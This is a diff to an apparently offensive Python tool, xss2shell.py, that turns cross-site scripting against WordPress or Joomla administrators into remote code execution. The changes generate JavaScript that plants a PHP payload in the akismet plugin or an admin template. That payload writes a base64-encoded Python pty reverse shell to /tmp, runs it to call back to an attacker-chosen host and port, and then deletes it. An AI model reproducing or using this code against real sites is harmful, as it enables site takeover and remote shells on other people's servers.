@@ -36,41 +36,38 @@ def help():
   -> Default python pty reverse shell: ./xss2shell.py [lhost] [lport] --[CMS]
   -> Custom php payload (no tags): ./xss2shell.py custom [payload.php] --[CMS]''')
 
-def preparepayload(payload, theme):
-	if theme == 'null':
+def preparepayload(payload, cms):
+	if cms == 'joomla':
 		f = open('joomla.js').read()
-		payload = urllib.quote_plus(payload)
-		payload = f % (payload)
 	else:
-		f = open('footer.php').read()
-		payload = f % (payload, '%s')
-		payload = urllib.quote_plus(payload)
 		f = open('wordpress.js').read()
-		payload = f % (theme, theme, payload, theme)
+	payload = urllib.quote_plus(payload)
+	payload = f % (payload)
 	open('out.js', 'w').write(payload)
 	print('[+] out.js generated!')
 
-def genpayload(lhost, payload, rshell, theme):
+def genpayload(lhost, payload, rshell, cms):
 	rshell = base64.b64encode(rshell % (lhost, lport))
-	payload = 'file_put_contents("/tmp/rshell.py", base64_decode("%s")); system("python /tmp/rshell.py; rm /tmp/rshell.py");' % (rshell)
-	preparepayload(payload, theme)
+	payload = '<?php file_put_contents("/tmp/rshell.py", base64_decode("%s")); system("python /tmp/rshell.py; rm /tmp/rshell.py"); ?>' % (rshell)
+	preparepayload(payload, cms)
 
 try:
 	if sys.argv[-1].lower() == '--wordpress':
-		theme = raw_input('[!] Enter theme in use: ')
+		cms = 'wordpress'
+		print('[+] Payload Location: /wp-content/plugins/akismet/index.php')
 	elif sys.argv[-1].lower() == '--joomla':
-		theme = 'null'
+		cms = 'joomla'
 		print('[+] Payload Location: /administrator/templates/isis/pay.php')
 	if sys.argv[1].lower() == 'custom':
 		print('[+] Using custom payload: %s' % (sys.argv[2]))
 		payload = open(sys.argv[2]).read()
-		preparepayload(payload, theme)
+		preparepayload(payload, cms)
 	elif sys.argv[1].lower() == 'help':
 		help()
 	else:
 		print('[+] Using default payload: python pty reverse shell')
 		lhost = sys.argv[1]
 		lport = sys.argv[2]
-		genpayload(lhost, lport, rshell, theme)
+		genpayload(lhost, lport, rshell, cms)
 except:
 	help()
